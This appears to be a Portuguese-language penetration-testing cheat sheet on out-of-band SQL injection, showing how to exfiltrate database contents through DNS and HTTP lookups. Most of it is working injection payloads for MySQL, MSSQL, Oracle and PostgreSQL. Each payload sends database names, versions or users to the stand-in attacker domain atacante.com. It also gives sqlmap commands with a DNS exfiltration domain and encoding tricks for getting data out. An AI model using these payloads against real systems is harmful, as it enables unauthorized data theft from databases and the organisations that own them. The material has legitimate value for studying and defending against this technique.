# Out-of-Band / Exfiltração DNS

## Como Funciona

Exfiltra dados através de requisições DNS ou HTTP para um servidor controlado pelo atacante, útil quando não há output visível e outras técnicas são inviáveis.

```
BD alvo → DNS lookup para banco_exfiltrado.atacante.com
Servidor DNS do atacante → registra a consulta
Atacante → lê o dado no log DNS
```

## Quando Usar

- Todas as outras técnicas falham
- Sem output visível e sem diferença de resposta
- Servidor tem saída DNS/HTTP para internet
- Firewall de entrada bloqueia mas saída é permissiva

## Infraestrutura Necessária

1. Domínio próprio com NS customizável (ex: burpcollaborator, interactsh)
2. Servidor DNS com log de queries
3. Ou usar Burp Collaborator / interact.sh

### Usando interact.sh (gratuito)
```bash
# Instalar
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# Gerar payload host
interactsh-client
# Output: abc123.oast.fun ← usar este domínio para exfiltração
```

## Técnicas por DBMS

### MySQL — LOAD_FILE DNS

```sql
-- Consulta DNS com dado
' AND LOAD_FILE(CONCAT('\\\\',database(),'.atacante.com\\a'))--

-- Exfiltrar versão
' AND LOAD_FILE(CONCAT('\\\\',version(),'.atacante.com\\a'))--
```

### MSSQL — xp_dirtree

```sql
-- DNS lookup com dado
'; DECLARE @host varchar(1024);
   SELECT @host = db_name() + '.atacante.com';
   EXEC master.sys.xp_dirtree '\\'+ @host +'\\a';--

-- Exfiltrar usuário
'; EXEC master.sys.xp_dirtree '\\' + system_user + '.atacante.com\a';--
```

### Oracle — UTL_HTTP

```sql
-- HTTP request com dado
' AND (SELECT UTL_HTTP.REQUEST('http://atacante.com/'||user) FROM dual) IS NOT NULL--

-- DNS via UTL_INADDR
' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS(user||'.atacante.com') FROM dual) IS NOT NULL--
```

### PostgreSQL — dblink / COPY

```sql
-- dblink para servidor externo
'; SELECT dblink_connect('host=atacante.com user='||(SELECT user)||' password=vlad dbname=test');--

-- COPY via programa
'; COPY (SELECT user) TO PROGRAM 'nslookup '||(SELECT user)||'.atacante.com';--
```

## Com SQLMap

```bash
# Usando Burp Collaborator (requer Burp Pro)
sqlmap -u "http://alvo.com/?id=1" \
  --technique=Q \
  --dns-domain=abc123.burpcollaborator.net \
  --batch

# Com interactsh
sqlmap -u "http://alvo.com/?id=1" \
  --technique=Q \
  --dns-domain=abc123.oast.fun \
  --batch
```

## Limitações

- Requer servidor externo controlado pelo atacante
- Firewall de saída pode bloquear DNS/HTTP
- Dados exfiltrados limitados pelo tamanho de hostname DNS (63 chars por label)
- Velocidade muito baixa

## Codificação para DNS

DNS não aceita todos os caracteres, então dados devem ser codificados:

```sql
-- MySQL: converter para hex antes de exfiltrar
' AND LOAD_FILE(CONCAT('\\\\',HEX(database()),'.atacante.com\\a'))--

-- Decodificar no servidor: echo "6e6f6d65_62616e636f" | xxd -r -p
```

## Indicadores de Sucesso SQLMap

```
[INFO] GET parameter 'id' appears to be 'MySQL UNION query (DNS) - 1 to 20 columns' injectable
[INFO] DNS data exfiltration is in progress, please be patient
```
